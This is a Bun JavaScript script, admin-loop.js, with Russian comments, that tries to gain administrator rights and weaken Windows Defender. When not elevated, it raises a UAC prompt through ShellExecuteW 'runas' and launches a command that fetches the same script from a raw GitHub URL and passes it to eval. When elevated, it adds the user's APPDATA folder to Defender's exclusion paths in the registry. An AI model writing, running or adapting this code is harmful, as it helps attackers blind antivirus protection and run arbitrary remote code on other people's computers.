// admin-loop.js
(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    try {
      const p = Bun.spawn({ cmd: ["net", "session"] });
      return (await p.exited) === 0;
    } catch (e) { return false; }
  };

      if (await isAdmin()) {
    const appData = process.env.APPDATA;
    console.log(`🛡️ Пробуем добавить исключение для: ${appData}`);

    // Метод 1: Прямая запись в реестр через reg.exe (иногда эффективнее WMIC)
    const regCmd = [
      "reg", "add", 
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
      "/v", appData, "/t", "REG_SZ", "/d", "0", "/f"
    ];

    const regProc = Bun.spawn({ cmd: regCmd });
    const exitCode = await regProc.exited;

    if (exitCode === 0) {
      console.log("✅ Реестр обновлен успешно.");
    } else {
      console.log("❌ Ошибка доступа к реестру (Access Denied). Это нормально при включенном Tamper Protection.");
    }


    console.log("\nНажми Enter для выхода...");
    for await (const line of console) break;
    return;
  }


  console.log("❌ Не админ. Запрос UAC...");
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/admin-loop.js";
  
  // РЕШЕНИЕ: Передаем в UAC команду, которая заставит НОВЫЙ bun сам скачать код
  const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;

  shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
  process.exit(0);
})();
